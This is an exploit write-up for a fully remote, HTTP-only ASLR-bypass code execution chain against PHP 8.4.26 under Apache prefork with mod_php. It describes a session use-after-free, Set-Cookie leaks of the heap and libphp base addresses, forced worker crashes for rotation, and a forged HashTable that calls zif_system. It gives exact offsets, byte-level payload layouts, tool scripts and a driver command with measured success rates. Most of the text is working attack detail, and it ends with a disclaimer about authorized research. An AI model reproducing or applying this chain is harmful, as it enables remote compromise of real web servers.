# Pure HTTP ASLR RCE: Two `Set-Cookie` Leaks + `zif_system`

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64, `172.16.0.103`)
Constraint: **fully remote, HTTP only; the target webroot only has ordinary pages (no specific PHP files)**.
Status: **the full ASLR-on chain works, and every end-to-end attack request is pure HTTP:
9/10 in the lab (with initial rotation) / 5/5 (without)**. The addresses come from two
pure HTTP leaks (Zend MM chunk base, libphp base), and the terminal uses `zif_system`
(no libc needed). Worker rotation between stages is also HTTP-triggered: `A_bigfields`
(3MB of live POST fields + OOM) corrupts the Zend MM heap, and an immediately following
B request that initializes the session makes the child `SIGABRT`, whereupon prefork
forks a fresh worker with an identical address space.

> Terminology: in this document "pure HTTP" means the **attack request chain** uses
> only HTTP. The lab driver still reboots Apache once at the start to get a clean
> master, and verifies the result with `cat /tmp/p1`; those two steps are
> lab-environment operations and are not part of the attack chain. The attack chain
> itself (leak, rotation, execution) contains no local signals.

---

## 1. Conclusions

Three request sequences (each one is an ordinary multipart POST to `index.php`):

| Stage | Request A | Request B | Output |
|---|---|---|---|
| 1 | `send_a_leak2.py 1001 12` | `b_numleak2.py 892 1 0x1000` | Zend MM chunk base |
| 2 | `send_a_leak3.py 1001 5 39 12 17` | `b_target.py 443 16 983` | libphp base |
| 3 | `send_a_pad.py 17 19 3 12` + `8:7` + 5×`7:7` | `send_b_zif.py 15 2 <HT> <ZIF>` | `id>/tmp/p1` |

Stage 1's mechanism and evidence are in [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md).
This document records stages 2, 3 and the full driver.

Measured (ASLR on, `personality=00000000`):

```text
W1=869675 chunk=0x7f4922200000 attempt=1
W2=869737 libphp=0x7f4923a00000 attempt=1
W3=869807 HTDATA=0x7f492226e0d8 ZIF=0x7f4923e3a870 attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
FULL_CHAIN_OK=5/5            # no initial rotation (post-restart workers are already fresh)
FULL_PURE_HTTP_OK=9/10       # with initial HTTP rotation (removes dependence on prior history)
```

The rotation primitive measured on its own:

```text
A_bigfields + session B -> child exit signal Abort (6) -> prefork respawn
10/10 on fresh workers; 5/5 after the leaks; 5/5 re-doing the heap leak after rotation
```

Stage 2's libphp leak under ASLR matches `/proc/<worker>/maps` exactly:

```text
Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%A1%87r%7F%00%00
Decode: 10 00 00 00 00 00 00 00 | 50 3c a1 87 72 7f 00 00
pDestructor = 0x7f7287a13c50
libphp      = 0x7f7287400000
maps: 7f7287400000-7f728754f000 r--p ... /usr/lib/apache2/modules/libphp.so
```

---

## 2. Stage 2: Leaking a libphp Code Pointer over Pure HTTP

### 2.1 Idea

Stage 1 already proved that the dangling `PS(id)`'s `len` can be hijacked to make
`php_url_encode` read out of bounds. This stage changes "what is read" to the
**56B HashTable page**, and replaces `len` = "a forged huge value" with a
**small integer field** inside the HashTable:

- B uses nested arrays `aNNNN[k]` to lay out many 56B HashTable pages in the chunk;
  each page holds 73 HashTables, `pDestructor = ZVAL_PTR_DTOR = libphp + 0x613c50`.
- A's shape (1001 fields with 39-byte values) puts the dangling `PS(id)` at
  `chunk + 0xb7400` (page `0xb7000`, `+0x400` within the page).
- In B's layout that address is exactly `$_POST['a0443']`'s HashTable's `+0x20`:
  `PS(id)+0x10` reads `nTableSize | nInternalPointer`.
- Expand `a0443` to 16 elements (`nTableSize=16`, `nInternalPointer=0`), so
  `ZSTR_LEN(PS(id)) = 16`; the data starts at `PS(id)+0x18`, covering exactly
  `nNextFreeElement` (8B) and `pDestructor` (8B).

Layout (relative to the chunk base):

```text
PS(id)          = chunk + 0xb7400
PS(id)+0x10     = HT + 0x20  -> nTableSize(16) | nInternalPointer(0) = 16  (len)
PS(id)+0x18     = HT + 0x28  -> nNextFreeElement (0x10)
HT + 0x30       = pDestructor = ZVAL_PTR_DTOR (libphp+0x613c50)
```

`b_target.py`'s constraints:

```text
983 arrays a0000..a0982; a0443 has 16 elements, the rest have 1 each
total fields = 982 + 16 = 998; plus PHPSESSID/PROGRESS that makes 1000 POST variables
=> does not trigger B's own max_input_vars warning (otherwise headers_sent would
   prevent the cookie from being sent)
```

### 2.2 Calibration record (no-ASLR)

- After `send_a_leak3.py 1001 5 39 12 17`, `ps_globals.id = 0x7ffff5eb7400`
  (chunk+0xb7400), `send_cookie=1`.
- In the raw B with 998 `aNNNN[0]`, chunk page `0xb7000` is a 56B HashTable page;
  that page's HashTable at `+0x3f0` belongs to `$_POST['a0443']` (verified via the
  parent bucket's key `a0443`).
- After changing a0443 to 16 elements while the rest stay at 1, `Send-Cookie` changes
  from the usual 32-character id to:

  ```text
  %10%00%00%00%00%00%00%00P%3C%A1%F4%FF%7F%00%00
  => nNextFreeElement=0x10 | pDestructor=0x7ffff4a13c50
  ```

- That pDestructor is exactly libphp's `ZVAL_PTR_DTOR` (`zval_ptr_dtor`),
  offset `0x613c50`. libphp's base is 2MB-aligned, which can serve as a leak check:
  `(pDestructor - 0x613c50) & 0x1fffff == 0` and
  `pDestructor & 0x1fffff == 0x13c50`.

### 2.3 Request details

A (`send_a_leak3.py 1001 5 39 12 17`):

- 1001 ordinary fields (5-character names, 39-byte values) → the 1001st triggers
  the `max_input_vars` warning (display_errors=On → headers_sent=1);
- `PHPSESSID` value is a single byte `\x00` → FILE_START generates a new random id,
  `send_cookie=1`, and `php_session_reset_id` fails because headers_sent;
- file field + 12MB field → OOM; `PS(id)` dangles at `chunk+0xb7400`.

B (`b_target.py 443 16 983`):

- no file fields; the pre-RINIT END cleanup calls `php_session_initialize()`;
- `reset_id` sends `Set-Cookie` using the dangling `PS(id)`;
- `php_url_encode(ZSTR_VAL(id), ZSTR_LEN(id))` reads 16 bytes:
  `nNextFreeElement` + `pDestructor`;
- afterwards `ps_files_open`'s id validation fails, producing a
  `Session ID is too long or contains illegal characters` warning,
  which does not affect the already-emitted response headers.

---

## 3. Stage 3: The `zif_system` Terminal

### 3.1 Why not libc

Stages 1/2 only leak the heap and libphp; the chunk scan found no libc pointers.
Therefore the terminal uses PHP's own internal function handler `zif_system`
(libphp + `0x43a870`), which needs no `system`/libc address.

The calling convention of `zif_system(zend_execute_data *execute_data, zval *return_value)`:

- `pDestructor(&bucket->val)` deterministically only gives `rdi = &bucket->val`;
- `&bucket->val` is disguised as a `zend_execute_data` with `num_args=1`;
  `arg1` is a zval pointing to a fake `zend_string` (containing the command);
- after `zif_system` executes the command, writing the return value to the
  uncontrolled `rsi` may crash, but the command has already run (consistent with
  g18's `/proc/self/maps` version).

### 3.2 Compact payload (167 bytes, entirely inside a live 192B zend_string)

Exploit B's fake HashTable lives in a live 167-byte field value string
(`chunk + 0x6e0d8`); the fake reference uses a 55B raw buffer to overwrite the
dangling reference at `R0 = chunk + 0x24e0`.

```text
data+0x00: gc refcount=1, type=IS_ARRAY(7)
data+0x08: flags=0x10, nTableMask=0xfffffff8
data+0x10: arData = data+0x20
data+0x18: nNumUsed=1, nNumOfElements=1
data+0x20: nTableSize=8, nInternalPointer=0
data+0x28: nNextFreeElement=0
data+0x30: pDestructor = zif_system          (== execute_data+0x10)
data+0x20: execute_data E (0x50 bytes)
  E+0x10: return_value = zif_system          (overlaps the HT pDestructor)
  E+0x2C: num_args = 1
  E+0x50: arg1 zval { value=data+0x80, type=IS_STRING(6) }
data+0x80: fake zend_string { gc 1/0x106, h=0, len=10, chars at 0x98 }
data+0x98: "id>/tmp/p1\0"
```

The fake reference (55B raw buffer, starting at `R0-0x10`):

```text
+0x10: gc refcount=1, type=IS_REFERENCE(10)
+0x18: val.value = chunk+0x6e0d8
+0x20: val.type  = 0x307 (IS_ARRAY_EX)
+0x28: sources   = 0
```

The trigger chain:

```text
php_session_track_init()
  zval_ptr_dtor(PS(http_session_vars))     # refcount 1 -> 0
    zend_reference_destroy(R0)
      zval_ptr_dtor(&ref->val)             # IS_ARRAY_EX
        zend_array_destroy(fake HT)
          zend_hash_destroy(fake HT)
            pDestructor(&bucket->val)      # = zif_system
              zif_system(execute_data)     # "id>/tmp/p1"
```

### 3.3 Exploit request shapes (calibrated under `use_cookies=1`)

- A: `send_a_pad.py 17 19 3 12 8:7 7:7 7:7 7:7 7:7 7:7`
  - the 6 pads put the dangling reference at `R0 = chunk + 0x24e0`,
    and `R0-0x10` is the start of a 56B block;
- B: `send_b_zif.py 15 2 <HTDATA> <ZIF> "id>/tmp/p1"`
  - with `N1=15` (a 31-character priming field), the 55B fake-ref raw buffer lands
    at `R0-0x10`;
  - `HTDATA = chunk+0x6e0d8` (live 167B string data);
  - `ZIF = libphp+0x43a870`.

> Note: switching `use_cookies` from 0 to 1 moves B's 56B landing point from
> `N1=16` to `N1=15` and changes some of leak A's offsets; all parameters above
> were measured under `use_cookies=1`.

---

## 4. Full Driver

`tools/pure_aslr_run.sh`:

1. Restart Apache (ASLR on, single-worker prefork);
2. Stage 1: `send_a_leak2 + b_numleak2`, parse the chunk base from the `Set-Cookie`
   (2MB-aligned mode); retry up to 3 times on failure;
3. Rotate the worker (HTTP): `send_a_bigfields 1001 3000 12 17` →
   `sup_poc.py b`, wait for prefork to fork a new child;
4. Stage 2: `send_a_leak3 + b_target`, parse
   `pDestructor`, validate `p & 0x1fffff == 0x13c50`; retry up to 3 times on failure;
5. Rotate the worker (as above);
6. Stage 3: `send_a_pad + send_b_zif`, check `/tmp/p1`; retry up to 5 times on failure.

By default the driver also performs one HTTP rotation before stage 1, killing off any
current child that may carry request history, so that stage 1's layout depends only on
this chain's request sequence.

```bash
# on the target machine
cd ~/php2shell-work
CMD="id>/tmp/p1" bash pure_aslr_run.sh
```

Measured output (5/5):

```text
W1=... chunk=0x...
W2=... libphp=0x...
W3=... HTDATA=0x... ZIF=0x... attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Evidence archived in `logs/pure_http_aslr_20261021.txt`;
the libphp leak's raw response is in `logs/libphp_leak_20261021.resp`.

---

## 5. Worker Rotation and ASLR Base Stability

- Under the same Apache master, prefork's re-forked children inherit identical
  **libphp/libc** mappings; the Zend MM chunk is mmap'd at that child's first request.
  Measured: after a worker restart, both chunk base and libphp base stay unchanged:

  ```text
  W1 chunk=0x7f5555e00000 libphp=0x7f5553a00000
  W2 chunk=0x7f5555e00000 libphp=0x7f5553a00000   # after the child aborts/forks
  ```

- Each stage must run on a **fresh worker**: every stage's A/B offsets are calibrated
  against "the worker's first request". Once a worker has served a leak request, A's
  dangling reference address moves (measured: `R0` moves from `chunk+0x24e0` to
  `chunk+0x14e0`) and the old B landing points break.
- **Pure HTTP rotation (implemented)**: `A_bigfields` sends 1001 ordinary fields (the
  first 1000 register as `$_POST`, each 3000 bytes) → FILE_START creates a new id →
  the 12MB field OOMs. The 3MB of live strings + OOM corrupts Zend MM's heap state;
  an immediately following B that initializes the session (`sup_poc.py b`:
  PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS, no file fields, going through the
  pre-RINIT END cleanup) triggers `zend_mm_panic`/`abort()`, the child exits with
  **SIGABRT**, and prefork immediately forks a new child. The log confirms:

  ```text
  [core:notice] child pid ... exit signal Abort (6)
  ```

  Measured: fresh workers 10/10, after leaks 5/5, re-leaking after rotation 5/5.
- The new child after rotation shares the same master's mmap layout with the old one,
  so both chunk base and libphp base are unchanged; that is what makes "leak once,
  swap the worker, keep going" possible.
- By default the driver also performs one HTTP rotation before stage 1, so even if
  the target worker has served unknown requests, stage 1's layout depends only on
  this chain's request sequence.

---

## 6. Limitations

1. Depends on `display_errors=On` (stage 1/2's A needs the warning output to set
   `headers_sent=1`).
   > 2026-10-21 update: an OOM-in-cookie variant that does not depend on
   > `display_errors` moves A's OOM into `php_session_send_cookie→php_url_encode`
   > (bin 128 empty + free pages exhausted), and on the B side passes through the
   > dangling `PS(mod_data)`, calling `send_cookie` with the dangling id; what remains
   > is forge calibration of the dangling id block. See
   > [DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md) for details.
2. Depends on `session.use_cookies=1` (default), `session.use_strict_mode=0`
   (default), `max_input_vars=1000` (default), `memory_limit=8M` (lab).
3. All in-chunk/in-module offsets are tied to this PHP 8.4.26 build and request shape:

   ```text
   chunk+0xb7400   stage-2 stale PS(id)
   chunk+0xb73f0   target HashTable (a0443)
   chunk+0x6e0d8   stage-3 fake HashTable string data
   chunk+0x24e0    stage-3 stale reference R0
   libphp+0x613c50 ZVAL_PTR_DTOR
   libphp+0x43a870 zif_system
   ```

   Changing the build/field lengths/request order requires re-calibration via the gdb
   method in `logs`; these offsets are all chunk/module-relative values, independent of ASLR.
4. After command execution the worker crash in the final `pefree` of
   `zend_hash_destroy`; the proof has already been written, matching the expectation of
   a one-shot exploit.
5. Stage 1 and stage 2's A shapes differ, but both are based on the same
   "headers_sent + empty PHPSESSID + OOM" primitive; both require A to be the worker's
   fresh request. Freshness is guaranteed by HTTP rotation:
   `send_a_bigfields.py 1001 3000 12 17` (~3MB field request body)
   + `sup_poc.py b`. That rotation relies on `memory_limit=8M` for the 12MB field to
   OOM, and makes the next request abort within Zend MM cleanup.
6. Success rate (lab, ASLR-on): without initial rotation **5/5**; with initial rotation
   (removing dependence on prior history) **9/10**. Failures are mostly timing/retry
   issues, and the driver has built-in stage-level retries; it is well above the
   "one in ten" requirement.
7. If the target's `memory_limit` is large, `A_bigfields`' OOM needs larger tail
   fields; the rotation primitive requires "exhaust/corrupt the heap first, then make
   session initialization trigger the abort", and both must be re-calibrated for the
   target's configuration.

---

## 7. Files

| File | Purpose |
|---|---|
| `tools/pure_aslr_run.sh` | Full-chain driver (leak→rotate→exploit, with validation/retries) |
| `tools/send_a_leak2.py` | Stage 1 A (heap leak prime) |
| `tools/b_numleak2.py` | Stage 1 B (80B raw forge + OOB read) |
| `tools/decode_leak.py` | Stage 1 response decode/chunk base |
| `tools/send_a_leak3.py` | Stage 2 A (`PS(id)=chunk+0xb7400`) |
| `tools/b_target.py` | Stage 2 B (a0443 expanded to 16 elements → leaks pDestructor) |
| `tools/send_a_pad.py` | Stage 3 A (6 pads + file + OOM) |
| `tools/send_b_zif.py` | Stage 3 B (compact zif_system payload) |
| `tools/send_b_rce2.py` | Older system terminal (no-ASLR baseline/crash experiments) |
| `tools/send_a_bigfields.py` | HTTP rotation A (3MB live fields + OOM) |
| `tools/sup_poc.py` | HTTP rotation B (session initialization triggers SIGABRT) |
| `tools/b_crash7.py` | Early HTTP crash primitive experiment (7-character live string) |
| `logs/http_heap_leak_20261021.resp/.txt` | Stage 1 raw responses/decode |
| `logs/libphp_leak_20261021.resp` | Stage 2 raw response |
| `logs/pure_http_aslr_20261021.txt` | Pure HTTP full-chain run records (5/5, 9/10) |

---

## 8. Disclaimer

For vulnerability research and reproduction in authorized environments only. The
request shapes, bin sequences and offsets are tied to this lab's PHP 8.4.26 build and
Apache/mod_php configuration; changing the build or configuration requires
re-calibration.
